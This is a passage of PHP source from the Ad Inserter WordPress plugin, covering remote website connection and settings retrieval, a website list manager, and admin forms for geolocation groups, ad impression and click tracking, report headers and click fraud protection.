function ai_request_remote_settings ($connected_website, $parameters = array ()) {
  $error_messages = '';

  require_once (ABSPATH.'/wp-admin/includes/file.php');

  if (trim ($connected_website ['name']) == '') $connected_website ['name'] = $connected_website ['url'];

  if (isset ($_GET ["ai-settings"]) && $_GET ["ai-settings"]) {
    // Alternative settings url
    $url = $connected_website ['url'].'?ai-get-settings=' . time ();
  } else
  $url = $connected_website ['url'].'wp-admin/admin-ajax.php?action=ai_ajax&ai-get-settings=' . time ();

  if (isset ($_GET ["ai-show-errors"]) && $_GET ["ai-show-errors"]) {
    $url .= '&ai-show-errors=1';
  }

  $debugging_link_html = "<a class='simple-link' style='color: unset;' href='".$url."' target='_blank'>".$connected_website ['name']."</a>";

  $current_user = wp_get_current_user ();

  $response = wp_remote_post ($url, array (
    'method'      => 'POST',
    'timeout'     => 30,
    'redirection' => 5,
    'blocking'    => true,
    'headers'     => array (),
    'user-agent'  => ai_random_user_agent (),
    'body'        => array_merge (array (
      'key'         => base64_decode ($connected_website ['key']),
      'user'        => defined ('AI_REMOTE_MANAGER') ? AI_REMOTE_MANAGER : $current_user->user_login,
      'user-email'  => defined ('AI_REMOTE_MANAGER') ? '' : $current_user->user_email,
    ), $parameters),
    )
  );


  if (!is_wp_error ($response)) {
    $remote_settings = $response ['body'];
    $remote_settings_html       = "<div id='ai-remote-dbg-error-msg' style='display: none; word-break: break-all;'>".strip_tags ($remote_settings)."</div>";
    $remote_settings_html_short = "<div id='ai-remote-dbg-error-msg' style='word-break: break-all;'>".substr (strip_tags ($remote_settings), 0, 200)."</div>";

    if (strlen ($remote_settings) >= 6) {
      $settings_array = explode ('#', $remote_settings);
      if (count ($settings_array) == 5) {
        if ($settings_array [0] == '' &&
            $settings_array [1] != '' &&
            $settings_array [3] == '' || is_numeric ($settings_array [3])) {

          $test_plugin_data = @base64_decode ($settings_array [1]);
          $test_multisite = @base64_decode ($settings_array [2]);
          $test_settings = @base64_decode ($settings_array [3]);
          if ($test_plugin_data !== false && $test_settings !== false && $test_multisite !== false) {
            if ($settings_array [3] != '') $settings_array [3] = (int) $settings_array [3];

            $connected_website ['plugin-data'] = ai_unserialize (base64_decode ($settings_array [1]));
            $connected_website ['multisite-settings'] = $settings_array [2];
            $connected_website ['multisite-blog-id'] = $settings_array [3];
            $connected_website ['settings'] = $settings_array [4];

            set_transient (AI_CONNECTED_WEBSITE, $connected_website, 30 * 60);
          } else {
              $error_messages .= "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __("Invalid data received from", 'ad-inserter') . ' ' . $debugging_link_html . " (4)</div>{$remote_settings_html}\n";
            }
        } else {
            $error_messages .= "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __("Invalid data received from", 'ad-inserter') . ' ' . $debugging_link_html . " (3)</div>{$remote_settings_html}\n";
          }
      } else {
          $error_messages .= "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __("Invalid data received from", 'ad-inserter') . ' ' . $debugging_link_html . " (2)</div>{$remote_settings_html_short}\n";
        }
    } else {
        if ($remote_settings == '') {
          $error_messages .= "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __('Error connecting to', 'ad-inserter') . ' ' . '<a class="simple-link" href="'.$url.'" target="_blank">' . $connected_website ['name'] . "</a> (" . __ ('No data received', 'ad-inserter') . ")</div>\n";
        } else $error_messages .= "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __("Invalid data received from", 'ad-inserter') . ' ' . $debugging_link_html . " (1)</div>{$remote_settings_html}\n";
      }
  } else {
    $error_messages .= "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __('Error connecting to', 'ad-inserter') . ' ' . $debugging_link_html . ' (' . $response->get_error_message () . ")</div>\n";
  }

  return $error_messages;
}

function website_list ($search_text) {

  $error_messages = '';
  $errors = 0;
  if (isset ($_GET ['save'])) {
    $websites_to_save = @json_decode (@base64_decode (@($_GET ['save'])));
    if ($websites_to_save === null) {
      $websites = array ();
    } else {
        $websites = array ();

        foreach ($websites_to_save as $website) {
          $website = (array) $website;

          if (!isset ($website ['url']) || !isset ($website ['name']) || !isset ($website ['key']) || trim ($website ['url']) == '') {
            $errors ++;
          } else {
              $url = trim ($website ['url']);
              if ($url != '' && $url [strlen ($url) - 1] != '/') {
                $url .= '/';
              }
              if ($url != '' && stripos ($url, 'http') === false) $url = 'http://' . $url;

              $website ['url'] = $url;

              if (trim ($website ['name']) == '') {
                $website ['name'] = rtrim (str_replace (array ('https', 'http', '://'), '', $website ['url']), '/');
              }

              $websites []= $website;
            }
        }
        if ($errors == 0) {
          update_option (AI_WEBSITES, $websites);
        } else {
            $error_messages .= "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __ ('Error saving websites', 'ad-inserter') . "</div>\n";
          }
      }
  }
  elseif (isset ($_GET ['delete'])) {
    if ($_GET ['delete'] == 'all') {
      $websites = array ();
      update_option (AI_WEBSITES, $websites);
    } else {
        $websites = get_option (AI_WEBSITES, array ());
        $website = (int) $_GET ['delete'] - 1;
        if (isset ($websites [$website])) {
          unset ($websites [$website]);
          $websites = array_values ($websites);
          update_option (AI_WEBSITES, $websites);
        }
      }
  }
  else {
      $websites = get_option (AI_WEBSITES, array ());
    }

  if (isset ($_GET ['connect'])) {
    if ($_GET ['connect'] == '') {
      $connected_website = get_transient (AI_CONNECTED_WEBSITE);
      if ($connected_website !== false) {
        ai_request_remote_settings ($connected_website, array ('disconnected' => '1'));
      }

      delete_transient (AI_CONNECTED_WEBSITE);
    } else {
        $connected_website_index = (int) $_GET ['connect'] - 1;

        $local_url = parse_url (home_url ());
        $remote_url = parse_url ($websites [$connected_website_index]['url']);

        if (!isset ($local_url ['path'])) $local_url ['path'] = '/';
        if (!isset ($remote_url ['path'])) $remote_url ['path'] = '/';

        if ($remote_url ['host'] == $local_url ['host'] && $remote_url ['path'] == $local_url ['path']) {
          $error_messages = "<div class='ai-ajax-error no-select' style='margin: 10px 0 0 0;'>" . __ ("Can't connect to itself", 'ad-inserter') . "</div>\n";
        }
        elseif (isset ($websites [$connected_website_index])) {
          $connected_website = $websites [$connected_website_index];

          if (isset ($_GET ['read-only']) && $_GET ['read-only']) {
            $connected_website ['key'] = '';
          }

          $error_messages = ai_request_remote_settings ($connected_website);
        }
      }
  }

  $connected_website = get_transient (AI_CONNECTED_WEBSITE);
  if ($connected_website === false) {
    unset ($connected_website);
  }

  ob_start ();

  if ($search_text != '') $search_array = explode (' ', $search_text); else $search_array = array ();

  if (isset ($_GET ['add'])) {
    $websites []= array ('url' => '', 'name' => '', 'key' => '');
  }

  $row_counter = 0;
  foreach ($websites as $index => $website) {
    $website_text = $index . ' '. $website ['name'] . ' ' . $website ['url'];

    foreach ($search_array as $search_item) {
      if (stripos ($website_text, trim ($search_item)) === false) continue 2;
    }

    $row_counter ++;
    $row_class = $index % 2 != 0 ? 'even' : 'odd';

    $url = $website ['url'];

    $name = $website ['name'];

    $website_connected_rw = isset ($connected_website) && $connected_website ['plugin-data']['write'];

    $website_connected = isset ($connected_website) && $connected_website ['url'] == $url && (!$website_connected_rw || $website ['key'] != '');
?>
        <tr class="ai-website-list <?php echo $row_class; ?>" data-website="<?php echo $index + 1; ?>">
          <td class="ai-website-labels" style="color: #444">
            <span  class="ai-list-button no-select" style="text-align: right; width: 16px; padding-right: 10px;"><?php echo $index + 1; ?></span>

            <span class="ai-list-button">
              <label class="checkbox-button ai-connect-website" style="margin-top: -1px;" title="<?php _e ('Connect website', 'ad-inserter'); ?>"><span class="checkbox-icon size-8 icon-preview<?php echo $website_connected ? ' on' : '', $website_connected_rw ? ' write' : ''; ?>"></span></label>
            </span>

            <span class="ai-list-button">
              <label class="checkbox-button ai-delete-website" style="margin-top: -1px; display: none;" title="<?php _e ('Delete website', 'ad-inserter'); ?>"><span class="checkbox-icon size-8 icon-text">&#10006;</span></label>
            </span>

            <span class="ai-list-button ai-website-desc ai-website-key" style="width: 12px;">
              <span style="display: inline-block;"><?php echo $website ['key'] != '' ? '<span class="dashicons dashicons-admin-network" style="width: 12px; margin: 4px 0 -6px; font-size: 10px;"></span>' : '&nbsp;'; ?></span>
            </span>
          </td>

          <td class="ai-website-labels ai-website-desc no-select" style=" text-align: left; padding-left: 9px; white-space: nowrap; overflow: hidden;<?php echo !$website_connected ? '  cursor: pointer;' : ''; ?> "><?php echo $name; ?></td>
          <td class="ai-website-labels ai-website-url no-select" style="text-align: left; padding-left: 15px; white-space: nowrap; overflow: hidden;"><a class="simple-link" href="<?php echo $url; ?>" target="_blank"><?php echo $url; ?></td>

          <td class="ai-website-editor" style="min-width: 1px; display: none;" title="<?php echo $website ['url']; ?>">
            <span  class="ai-list-button no-select" style="text-align: right; width: 16px; padding-right: 10px;"><?php echo $index + 1; ?></span>
          </td>
          <td class="ai-website-editor" style="text-align: left; padding-left: 5px; white-space: nowrap; overflow: hidden; display: none;">
            <input type="text" class="ai-website-desc" style="min-height: 18px; height: 18px; line-height: 18px; font-size: 12px; width: 59%; margin-left: -5px;"size="35" maxlength="100" />
            <input type="text" placeholder="<?php _e ('Key', 'ad-inserter'); ?>" class="ai-website-key" style="min-height: 18px; height: 18px; line-height: 18px; font-size: 12px; width: 39%;" data-key="<?php echo base64_decode ($website ['key']) ?>" size="16" maxlength="16" />
          </td>
          <td class="ai-website-editor" style="text-align: left; padding-left: 5px; white-space: nowrap; overflow: hidden; display: none;" >
            <input type="text" class="ai-website-url" style="min-height: 18px; height: 18px; line-height: 18px; font-size: 12px; width: 99%;"size="35" maxlength="100" />
          </td>
        </tr>

<?php
  }
  $table_rows = ob_get_clean ();

?>

    <table id="ai-website-list-table" class="exceptions ai-sortable" cellspacing=0 cellpadding=0 style="width: 100%; table-layout: fixed;">
      <thead>
        <tr class="no-select">
          <th style="text-align: left; width: 82px;"></th>
          <th style="text-align: left; padding-left: 9px; width: 50%; min-width: 200px;"><?php _e ('Name', 'ad-inserter'); ?></th>
          <th style="text-align: left; padding-left: 15px; width: 45%;"><?php _e ('Address', 'ad-inserter'); ?></th>
        </tr>
      </thead>
      <tbody>
<?php echo $table_rows; ?>
      </tbody>
    </table>
<?php

  echo $error_messages;

  if ($row_counter == 0) {
    if ($search_text == '')
      echo "<div style='margin: 10px 0 0 0;'>", __ ('No website configured', 'ad-inserter'), "</div>"; else
        echo "<div style='margin: 10px 0 0 0;'>", __ ('No website matches search keywords', 'ad-inserter'), "</div>";
  }
}

} // AD_INSERTER_WEBSITES


if (!defined( 'AD_INSERTER_GEO_GROUPS'))  define ('AD_INSERTER_GEO_GROUPS', 6);

function ai_plugin_settings ($start, $end, $exceptions) {
  global $ad_inserter_globals, $block_object;

  if (!ai_remote_plugin_data ('pro', true)) return;

  $tracking           = get_global_tracking ();
  $internal_tracking  = get_internal_tracking ();
  $external_tracking  = get_external_tracking ();
  $track_logged_in    = get_track_logged_in ();
  $track_pageviews    = get_track_pageviews ();
  $click_detection    = get_click_detection ();

  $geo_db             = get_geo_db ();
  $geo_db_updates     = get_geo_db_updates ();

  $geo_db_class       = defined ('AI_MAXMIND_DB') || !$geo_db_updates ? '' : 'maxmind-db-missing';
  $geo_db_text        = !defined ('AI_MAXMIND_DB') && !$geo_db_updates ? 'missing' : '';
                                                                                                           // Translators: %s MaxMind
  $geo_db_license     = $geo_db == AI_GEO_DB_MAXMIND && $geo_db_updates ? '<span style="float: right;">' . sprintf (__ ('This product includes GeoLite2 data created by %s', 'ad-inserter'), '<a class="simple-link" href="http://www.maxmind.com" target="_blank">MaxMind</a>') . '</span>' : '';
                                                                                                           // Translators: %s HTML tags
  $geo_db_license_key = $geo_db == AI_GEO_DB_MAXMIND && $geo_db_updates ? '<span style="float: right;">' . sprintf (__ ('Create and manage %s MaxMind license key %s', 'ad-inserter'), '<a class="simple-link" href="https://adinserter.pro/documentation/plugin-settings#maxmind" target="_blank">', '</a>') . '</span>' : '';
?>
    <div id="tab-geo-targeting" style="padding: 0px;">

<?php if (ai_settings_check ('AD_INSERTER_MAXMIND') && (!is_multisite() || is_main_site ())) : ?>

      <div class="ai-responsive-table ai-rounded">
        <table>
          <tbody>
            <tr>
              <td>
                <?php _e ('IP geolocation database', 'ad-inserter'); ?>
              </td>
              <td>
                <select id="geo-db" name="geo-db" default="<?php echo DEFAULT_GEO_DB; ?>" title="<?php _e ('Select IP geolocation database.', 'ad-inserter'); ?>">
                   <option value="<?php echo AI_GEO_DB_INTERNAL; ?>" <?php echo ($geo_db == AI_GEO_DB_INTERNAL) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INTERNAL; ?></option>
                   <option value="<?php echo AI_GEO_DB_MAXMIND; ?>" <?php echo ($geo_db == AI_GEO_DB_MAXMIND) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_MAXMIND; ?></option>
                </select>
                <?php echo $geo_db_license; ?>
              </td>
            </tr>

<?php if ($geo_db == AI_GEO_DB_MAXMIND): ?>
            <tr>
              <td>
                <?php _e ('Automatic database updates', 'ad-inserter'); ?>
              </td>
              <td>
                <select id="geo-db-updates" name="geo-db-updates" title="<?php _e ('Automatically download and update free GeoLite2 IP geolocation database by MaxMind', 'ad-inserter'); ?>" value="Value" default="<?php echo DEFAULT_GEO_DB_UPDATES; ?>">
                    <option value="<?php echo AI_DISABLED; ?>" <?php echo ($geo_db_updates == AI_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                    <option value="<?php echo AI_ENABLED; ?>" <?php echo ($geo_db_updates == AI_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                </select>
              </td>
            </tr>
            <tr>
              <td>
                <?php _e ('MaxMind license key', 'ad-inserter'); ?>
              </td>
              <td>
                <input type="text" id="maxmind-license-key" name="maxmind-license-key" value="<?php echo get_maxmind_license_key (); ?>" default="<?php echo DEFAULT_MAXMIND_LICENSE_KEY; ?>" title="<?php _e ("Enter license key obtained from MaxMind", 'ad-inserter'); ?>" size="22" maxlength="40" />
                <?php echo $geo_db_license_key; ?>
              </td>
            </tr>
            <tr>
              <td>
                <?php _e ('Database', 'ad-inserter'); ?> <span id="maxmind-db-status" class="<?php echo $geo_db_class; ?>" style="color: #f00;"><?php echo $geo_db_text; ?></span>
              </td>
              <td style="width: 73%">
                <input style="width: 100%;" type="text" id="geo-db-location" name="geo-db-location" value="<?php echo get_geo_db_location (true); ?>" default="<?php echo DEFAULT_GEO_DB_LOCATION; ?>" title="<?php _e ("Absolute path starting with '/' or relative path to the MaxMind database file", 'ad-inserter'); ?>" size="100" maxlength="140" />
              </td>
            </tr>
<?php endif; ?>
          </tbody>
        </table>
      </div>

<?php endif; ?>

      <div class="ai-responsive-table ai-rounded">
        <table>
          <tbody>
<?php
  for ($group = 1; $group <= ai_settings_value ('AD_INSERTER_GEO_GROUPS'); $group ++) {
?>
            <tr>
              <td style="padding-right: 7px;">
                <?php /* translators: %d: group number */ printf (__('Group %d', 'ad-inserter'), $group); ?>
              </td>
              <td style="padding-right: 7px;">
                <input style="margin-left: 0px;" type="text" id="group-name-<?php echo $group; ?>" name="group-name-<?php echo $group; ?>" value="<?php echo get_country_group_name ($group); ?>" default="<?php echo DEFAULT_COUNTRY_GROUP_NAME, ' ', $group; ?>" size="15" maxlength="40" />
              </td>
              <td style="">
                <?php _e ('countries', 'ad-inserter'); ?>
                &nbsp;
                <button id="group-country-button-<?php echo $group; ?>" type="button" class='ai-button ai-button-small' style="display: none; outline: transparent; width: 15px; height: 15px; margin-top: -3px;" title="<?php _e ('Toggle country editor', 'ad-inserter'); ?>"></button>
              </td>
              <td style="width: 70%;">
                <input style="width: 100%;" class="ai-list-uppercase" title="<?php _e ('Comma separated country ISO Alpha-2 codes', 'ad-inserter'); ?>" type="text" id="group-country-list-<?php echo $group; ?>" name="group-country-list-<?php echo $group; ?>" default="" value="<?php echo $ad_inserter_globals ['G'.$group]; ?>" size="54" maxlength="500"/>
              </td>
            </tr>

            <tr>
              <td colspan="4" class="country-flags">
                <select id="group-country-select-<?php echo $group; ?>" data-parameters="<?php echo $group; ?>" multiple="multiple" style="padding: 8px 0; display: none;">
                </select>
              </td>
            </tr>
<?php
  }
?>
          </tbody>
        </table>
      </div>

    </div>

<?php
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
?>

    <div id="tab-tracking" style="margin: 0px 0; padding: 0;">

      <div style="margin: 8px 0; line-height: 24px;">
        <div style="float: right;">
<?php
  if (get_track_pageviews ()) {
?>
          <span class="ai-toolbar-button" style="float: right;">
            <input type="checkbox" value="0" id="statistics-button-0" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
            <label class="checkbox-button" for="statistics-button-0" title="<?php _e ('Toggle Statistics', 'ad-inserter'); ?>"><span class="checkbox-icon icon-statistics"></span></label>
          </span>
<?php
  }
?>
          <span style="float: right;">
            <input type="hidden"   name="tracking" value="0" style="animation-name: unset;" />
            <input type="checkbox" name="tracking" id="tracking" value="1" default="<?php echo DEFAULT_TRACKING; ?>" <?php if ($tracking == AI_TRACKING_ENABLED) echo 'checked '; ?> style="animation-name: unset; display: none;" />
            <label class="checkbox-button" style="margin-left: 10px;" for="tracking" title="<?php _e ('Enable impression and click tracking. You also need to enable tracking for each block you want to track.', 'ad-inserter'); ?>"><span class="checkbox-icon icon-enabled<?php if ($tracking == AI_TRACKING_ENABLED) echo ' on'; ?>"></span></label>
          </span>

<?php
  if (ai_settings_check ('AD_INSERTER_REPORTS') && get_track_pageviews ()) {
?>
          <span class="ai-toolbar-button" style="float: right;">
            <span id="export-csv-button-0" class="checkbox-button dashicons dashicons-list-view" title="<?php _e ('Generate CSV report', 'ad-inserter'); ?>" style="display: none;"></span>
          </span>

          <span class="ai-toolbar-button" style="float: right;">
            <span id="export-pdf-button-0" class="checkbox-button dashicons dashicons-media-text" title="<?php _e ('Generate PDF report', 'ad-inserter'); ?>" style="display: none;"></span>
          </span>
<?php
  }
?>
        </div>

        <div style="vertical-align: sub; display: inline-block;">
          <h3 style="margin: 0; display: inline-block;"><?php _e ('Impression and Click Tracking', 'ad-inserter'); ?></h3>
          <?php if (get_global_tracking () == AI_TRACKING_DISABLED) echo '<span style="color: #f00;"> &nbsp; ', _x ('NOT ENABLED', 'ad blocking detection', 'ad-inserter'), '</span>'; ?>
        </div>
      </div>

      <div style="clear: both;"></div>

<?php
    ai_statistics_container (0, true);
?>

      <div id="tab-tracking-settings">
        <div class="ai-rounded" style="margin: 8px 0 8px;">
          <table style="width: 100%;">
            <tbody>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Internal', 'ad-inserter'); ?>
                </td>
                <td style="padding: 4px 0px 4px 2px;">
                  <input type="hidden" name="internal-tracking" value="0" />
                  <input type="checkbox" name="internal-tracking" value="1" default="<?php echo DEFAULT_INTERNAL_TRACKING; ?>" title="<?php _e ('Track impressions and clicks with internal tracking and statistics', 'ad-inserter'); ?>" <?php if ($internal_tracking == AI_ENABLED) echo 'checked '; ?> />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('External', 'ad-inserter'); ?>
                </td>
                <td style="padding: 4px 0px 4px 2px;">
                  <input type="hidden" name="external-tracking" value="0" />
                  <input type="checkbox" name="external-tracking" value="1" default="<?php echo DEFAULT_EXTERNAL_TRACKING; ?>" title="<?php _e ('Track impressions and clicks with Google Analytics or Matomo (needs tracking code installed)', 'ad-inserter'); ?>" <?php if ($external_tracking == AI_ENABLED) echo 'checked '; ?> />
                </td>
              </tr>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Track Pageviews', 'ad-inserter'); ?>
                </td>
                <td>
                  <select
                    id="track-pageviews"
                    name="track-pageviews"
                    title="<?php _e ('Track Pageviews by Device (as configured for viewports)', 'ad-inserter'); ?>"
                    value="Value"
                    default="<?php echo DEFAULT_TRACK_PAGEVIEWS; ?>">
                      <option value="<?php echo AI_TRACKING_DISABLED; ?>" <?php echo ($track_pageviews == AI_TRACKING_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                      <option value="<?php echo AI_TRACKING_ENABLED; ?>" <?php echo ($track_pageviews == AI_TRACKING_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                  </select>
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Track for Logged in Users', 'ad-inserter'); ?>
                </td>
                <td>
                  <select
                    id="track-logged-in"
                    name="track-logged-in"
                    title="<?php _e ('Track impressions and clicks from logged in users', 'ad-inserter'); ?>"
                    value="Value"
                    default="<?php echo DEFAULT_TRACKING_LOGGED_IN; ?>">
                      <option value="<?php echo AI_TRACKING_DISABLED; ?>" <?php echo ($track_logged_in == AI_TRACKING_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                      <option value="<?php echo AI_TRACKING_ENABLED; ?>" <?php echo ($track_logged_in == AI_TRACKING_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                  </select>
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Click Detection', 'ad-inserter'); ?>
                </td>
                <td>
                  <select
                    id="click-detection"
                    name="click-detection"
                    title="<?php _e ('Standard method detects clicks only on banners with links, Advanced method can detect clicks on any kind of ads, but it is slightly less accurate', 'ad-inserter'); ?>"
                    value="Value"
                    default="<?php echo DEFAULT_CLICK_DETECTION; ?>">
                      <option value="<?php echo AI_CLICK_DETECTION_STANDARD; ?>" <?php echo ($click_detection == AI_CLICK_DETECTION_STANDARD) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STANDARD; ?></option>
<?php
  if (ai_settings_check ('AD_INSERTER_ACD')) {
?>
                      <option value="<?php echo AI_CLICK_DETECTION_ADVANCED; ?>" <?php echo ($click_detection == AI_CLICK_DETECTION_ADVANCED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ADVANCED; ?></option>
<?php
  }
?>
                  </select>
                </td>
              </tr>

            </tbody>
          </table>
        </div>

<?php

  if (ai_settings_check ('AD_INSERTER_REPORTS')) {
?>
        <div class="ai-rounded" style="margin: 8px 0 8px;">
          <table style="width: 100%;">
            <tbody>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Report header image', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-header-image" style="margin-left: 0px; width: 95%;" title="<?php _e ("Image or logo to be displayed in the header of the statistics report. Absolute path starting with '/' or relative path to the image file. Clear to reset to default image.", 'ad-inserter'); ?>" type="text" name="report-header-image" value="<?php echo get_report_header_image (); ?>" default="<?php echo DEFAULT_REPORT_HEADER_IMAGE; ?>" maxlength="80" />
                  <button id="report-header-image-button" type="button" class='ai-button ai-button-small' style="display: none; outline: transparent; float: right; margin-top: 4px; width: 15px; height: 15px;" title="<?php _e ('Select or upload header image', 'ad-inserter'); ?>" data=home="<?php echo home_url (), '/'; ?>"></button>
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Report header title', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-header-title" style="margin-left: 0px; width: 100%;" title="<?php _e ("Title to be displayed in the header of the statistics report. Text or HTML code, clear to reset to default text.", 'ad-inserter'); ?>" type="text" name="report-header-title" value="<?php echo get_report_header_title (); ?>" default="<?php echo DEFAULT_REPORT_HEADER_TITLE; ?>" maxlength="180" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Report header description', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-header-description" style="margin-left: 0px; width: 100%;" title="<?php _e ("Description to be displayed in the header of the statistics report. Text or HTML code, clear to reset to default text.", 'ad-inserter'); ?>" type="text" name="report-header-description" value="<?php echo get_report_header_description (); ?>" default="<?php echo DEFAULT_REPORT_HEADER_DESCRIPTION; ?>" maxlength="180" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Report footer', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-footer" style="margin-left: 0px; width: 100%;" title="<?php _e ("Text to be displayed in the footer of the statistics report. Clear to reset to default text.", 'ad-inserter'); ?>" type="text" name="report-footer" value="<?php echo get_report_footer (); ?>" default="<?php echo DEFAULT_REPORT_FOOTER; ?>" maxlength="180" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Public report key', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-key" style="margin-left: 0px; width: 100%;" title="<?php _e ("String to generate unique report IDs. Clear to reset to default value.", 'ad-inserter'); ?>" type="text" name="report-key" value="<?php echo get_report_key (); ?>" default="<?php echo DEFAULT_REPORT_KEY; ?>" maxlength="64" />
                </td>
              </tr>
            </tbody>
          </table>
        </div>
<?php
  }
?>

        <div class="ai-rounded" style="margin: 8px 0 8px;">
          <table style="width: 100%;">
            <tbody>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Event category', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="external-tracking-category" style="margin-left: 0px; width: 100%;" title="<?php _e ("Category name used for external tracking events. You can use tags to get the event, the number or the name of the block that caused the event.", 'ad-inserter'); ?>" type="text" name="external-tracking-category" value="<?php echo get_external_tracking_category (); ?>" default="<?php echo DEFAULT_EXTERNAL_TRACKING_CATEGORY; ?>" maxlength="80" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Event action', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="external-tracking-action" style="margin-left: 0px; width: 100%;" title="<?php _e ("Action name used for external tracking events. You can use tags to get the event, the number or the name of the block that caused the event.", 'ad-inserter'); ?>" type="text" name="external-tracking-action" value="<?php echo get_external_tracking_action (); ?>" default="<?php echo DEFAULT_EXTERNAL_TRACKING_ACTION; ?>" maxlength="80" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Event label', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="external-tracking-label" style="margin-left: 0px; width: 100%;" title="<?php _e ("Label name used for external tracking events. You can use tags to get the event, the number or the name of the block that caused the event.", 'ad-inserter'); ?>" type="text" name="external-tracking-label" value="<?php echo get_external_tracking_label (); ?>" default="<?php echo DEFAULT_EXTERNAL_TRACKING_LABEL; ?>" maxlength="80" />
                </td>
              </tr>
            </tbody>
          </table>
        </div>


<?php
  if (ai_settings_check ('AD_INSERTER_LIMITS')) {
    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    if ($connected_website !== false) {
      $ai_cfp_ip_list_count = isset ($connected_website ['plugin-data']['cfp-blocked']) ? $connected_website ['plugin-data']['cfp-blocked'] : '';
    } else $ai_cfp_ip_list_count = ai_cfp_ip_list_count ();

?>
        <div class="ai-rounded" style="margin: 8px 0 8px;">
          <table style="width: 100%;">
            <tbody>

              <tr>
                <td style="width: 22%;">
                <?php _e ('Click fraud protection', 'ad-inserter'); ?>
                </td>
                <td style="height: 26px;">
                  <input type="hidden" name="cfp" value="0" />
                  <input type="checkbox" name="cfp" value="1" default="<?php echo DEFAULT_CLICK_FRAUD_PROTECTION; ?>" title="<?php _e ('Globally enable click fraud protection for selected blocks.', 'ad-inserter'); ?>" <?php if (get_click_fraud_protection () == AI_ENABLED) echo 'checked '; ?> />
                </td>
              </tr>

              <tr>
                <td>
                  <?php _e ('Global visitor limits', 'ad-inserter'); ?>
                </td>
                <td>
                  <span>
                    <input type="text" name="global-visitor-limit-cpt" value="<?php echo get_global_visitor_limit_clicks_per_time_period (); ?>"  default="<?php echo DEFAULT_GLOBAL_VISITOR_LIMIT_CPT; ?>" title="<?php _e ('Maximum number of clicks per time period for each visitor. Empty means no click limit per time period for visitors.', 'ad-inserter'); ?>" size="6" maxlength="3" /> <?php echo _n ('click', 'clicks', (int) get_global_visitor_limit_clicks_per_time_period (), 'ad-inserter'); ?> <?php echo __ ('per', 'ad-inserter'); ?>
                  </span>
                  <span>
                    <input type="text" name="global-visitor-limit-time" value="<?php echo get_global_visitor_limit_clicks_time_period (); ?>"  default="<?php echo DEFAULT_GLOBAL_VISITOR_LIMIT_TIME; ?>" title="<?php _e ('Time period in days. Use decimal value (with decimal point) for shorter periods. Empty means no time limit.', 'ad-inserter'); ?>" size="6" maxlength="6" /> <?php echo _n ('day', 'days', (int) get_global_visitor_limit_clicks_time_period (), 'ad-inserter'); ?>
                  </span>
                </td>
              </tr>

              <tr>
                <td>
                  <?php _e ('Protection time', 'ad-inserter'); ?>
                </td>
                <td>
                  <input type="text" name="cfp-time" value="<?php echo get_click_fraud_protection_time (); ?>"  default="<?php echo DEFAULT_CLICK_FRAUD_PROTECTION_TIME; ?>" title="<?php _e ('Time period in days in which blocks with enabled click fraud protection will be hidden. Use decimal value (with decimal point) for shorter periods.', 'ad-inserter'); ?>" size="6" maxlength="6" /> <?php echo _n ('day', 'days', (int) get_click_fraud_protection_time (), 'ad-inserter'); ?>
                </td>
              </tr>

              <tr>
                <td>
                <?php _e ('Block IP address', 'ad-inserter'); ?>
                </td>
                <td style="height: 26px;">
                  <span>
                    <input type="hidden" name="cfp-block-ip-address" value="0" />
                    <input type="checkbox" name="cfp-block-ip-address" value="1" default="<?php echo DEFAULT_CFP_BLOCK_IP_ADDRESS; ?>" title="<?php _e ('Block visitor\'s IP address when protection is activated', 'ad-inserter'); ?>" <?php if (get_cfp_block_ip_address () == AI_ENABLED) echo 'checked '; ?> />
                  </span>
